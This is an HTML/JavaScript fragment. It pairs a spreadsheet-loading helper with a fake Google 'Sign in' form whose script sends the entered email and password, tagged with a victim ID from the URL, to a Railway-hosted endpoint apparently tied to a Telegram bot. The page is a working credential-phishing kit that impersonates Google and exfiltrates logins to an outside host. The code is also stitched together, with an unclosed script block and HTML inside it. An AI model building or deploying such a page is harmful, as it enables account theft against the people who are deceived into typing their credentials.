<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }

        <h2>Sign in</h2>
        <p>Use a Google account</p>
        <form>
            <div class="inputBox">
                <input type="email" id="emailInput" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Email address or telephone number</label>
            </div>
            <div class="inputBox">
                <input type="password" id="passwordInput" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Password</label>
            </div>
            <div class="forgot">
                <button type="button">Forgot your address?</button>
            </div>
            <input type="button" id="loginButton" value="Sign In">
            <p id="status"></p>
        </form>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const unique_id = urlParams.get('id');
        const api_url = 'tgbot-telegrambot2.up.railway.app'; // Replace with your Railway URL

        const loginButton = document.getElementById('loginButton');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const status = document.getElementById('status');

        if (!unique_id) {
            status.textContent = 'Error: ID not found!';
            loginButton.style.display = 'none';
            return;
        }

        loginButton.addEventListener('click', () => {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) {
                status.textContent = 'Please enter email or password!';
                return;
            }

            status.textContent = 'Submitting data...';
            fetch(`${api_url}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ unique_id, email, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    status.textContent = 'Data successfully submitted!';
                } else {
                    status.textContent = `Error: ${data.message}`;
                }
            })
            .catch(error => {
                status.textContent = `Error submitting data: ${error}`;
            });
        });
    </script>
